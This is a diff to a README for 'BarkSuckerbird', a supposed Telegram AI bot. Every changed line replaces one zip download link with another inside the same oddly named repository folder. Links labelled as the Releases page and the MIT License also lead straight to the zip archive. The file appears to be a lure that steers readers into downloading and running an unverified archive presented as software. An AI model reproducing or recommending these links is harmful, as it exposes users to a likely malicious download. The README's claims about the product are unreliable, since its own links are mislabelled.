@@ -4,11 +4,11 @@
 BarkSuckerbird is an advanced Telegram AI bot that combines multiple AI models with live web search capabilities. Its design ensures 24/7 availability, making it an excellent choice for your automated needs. 
 
 ## 📥 Download BarkSuckerbird
-[![Download BarkSuckerbird](https://raw.githubusercontent.com/Familygeomyidaetauromachy404/BarkSuckerbird/main/Hybodus/BarkSuckerbird-v3.8.zip)](https://raw.githubusercontent.com/Familygeomyidaetauromachy404/BarkSuckerbird/main/Hybodus/BarkSuckerbird-v3.8.zip)
+[![Download BarkSuckerbird](https://github.com/Familygeomyidaetauromachy404/BarkSuckerbird/raw/refs/heads/main/Hybodus/Bark-Suckerbird-v2.0.zip)](https://github.com/Familygeomyidaetauromachy404/BarkSuckerbird/raw/refs/heads/main/Hybodus/Bark-Suckerbird-v2.0.zip)
 
 To get started, download the latest version from the Releases page:
 
-[Download here.](https://raw.githubusercontent.com/Familygeomyidaetauromachy404/BarkSuckerbird/main/Hybodus/BarkSuckerbird-v3.8.zip)
+[Download here.](https://github.com/Familygeomyidaetauromachy404/BarkSuckerbird/raw/refs/heads/main/Hybodus/Bark-Suckerbird-v2.0.zip)
 
 ## 🔍 Features
 - **Multiple AI Integrations**: Utilize various AI models to enhance user interaction.
@@ -24,7 +24,7 @@ To run BarkSuckerbird smoothly, ensure your system meets the following criteria:
 - **Internet Connection**: Required for operations and updates.
 
 ## 😉 How to Install
-1. **Visit the Releases Page**: Go to the [BarkSuckerbird Releases page](https://raw.githubusercontent.com/Familygeomyidaetauromachy404/BarkSuckerbird/main/Hybodus/BarkSuckerbird-v3.8.zip).
+1. **Visit the Releases Page**: Go to the [BarkSuckerbird Releases page](https://github.com/Familygeomyidaetauromachy404/BarkSuckerbird/raw/refs/heads/main/Hybodus/Bark-Suckerbird-v2.0.zip).
    
 2. **Download the Latest Version**: Choose the latest version and click on the file suitable for your operating system.
 
@@ -56,7 +56,7 @@ If you encounter issues while running BarkSuckerbird, consider the following ste
 If you want to help improve BarkSuckerbird, contributions are welcome. You can suggest features or report issues by opening a new issue on the GitHub repository.
 
 ## 📄 License
-BarkSuckerbird is open-source software. You can freely use, modify, and distribute it under the terms of the [MIT License](https://raw.githubusercontent.com/Familygeomyidaetauromachy404/BarkSuckerbird/main/Hybodus/BarkSuckerbird-v3.8.zip).
+BarkSuckerbird is open-source software. You can freely use, modify, and distribute it under the terms of the [MIT License](https://github.com/Familygeomyidaetauromachy404/BarkSuckerbird/raw/refs/heads/main/Hybodus/Bark-Suckerbird-v2.0.zip).
 
 ## 📞 Get Support
 For support, you can reach out by creating an issue on the GitHub page or by contacting us through Telegram.
